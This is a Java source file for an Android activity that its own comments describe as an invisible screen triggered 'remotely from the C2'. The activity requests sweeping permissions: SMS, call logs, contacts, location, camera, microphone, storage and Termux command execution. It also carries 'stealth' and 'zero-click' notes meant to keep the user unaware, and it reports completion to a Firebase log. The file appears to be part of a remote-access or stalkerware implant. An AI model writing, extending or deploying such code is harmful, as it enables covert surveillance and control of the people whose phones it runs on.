package com.labs.labrats;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * Invisible activity used to trigger system permission prompts remotely from the C2.
 * Allows permissions to be "repaired" without revealing the server dashboard.
 */
public class PermissionActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 2001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Activity is transparent via theme in Manifest
        getWindow().setGravity(android.view.Gravity.BOTTOM);
        
        Log.d("PermissionActivity", "Remote permission repair sequence initiated.");
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        // 1. File Access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        // 2. Comms
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.CALL_PHONE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_SMS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.SEND_SMS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);

        // 3. Sensors / Hardware
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.CAMERA);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);

        // 4. Termux Bridge
        if (ContextCompat.checkSelfPermission(this, "com.termux.permission.RUN_COMMAND") != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add("com.termux.permission.RUN_COMMAND");

        if (!permissionsNeeded.isEmpty()) {
            // [HARDENED_REQUEST] Re-trigger even if system thinks we shouldn't
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
            
            // Safety: Give Auto-Pilot more time to cycle through large batches
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (!isFinishing()) {
                    Log.d("PermissionActivity", "No interaction detected, opening system settings fallback.");
                    openAppSettings();
                }
            }, 12000);
        } else {
            // Finalize: No more prompts needed
            finishSequence();
        }
    }

    private void openAppSettings() {
        try {
            // [STEALTH_FIX] Don't show toast or open settings automatically
            // If it fails, just wait for the next trigger or remote command
            Log.w("PermissionActivity", "Zero-Click granting sequence stalled. Terminating activity.");
        } catch (Exception ignored) {}
        finish();
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        boolean allGranted = true;
        for (int res : grantResults) {
            if (res != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (!allGranted) {
            // User declined again: Open actual settings as final repair path
            openAppSettings();
        } else {
            finishSequence();
        }
    }

    private void finishSequence() {
        Log.d("PermissionActivity", "Repair sequence complete. Closing invisible activity.");
        FirebaseConfig.logActivity("LOCATE_MAINTENANCE: Permission repair sequence completed.");
        finish();
    }
}
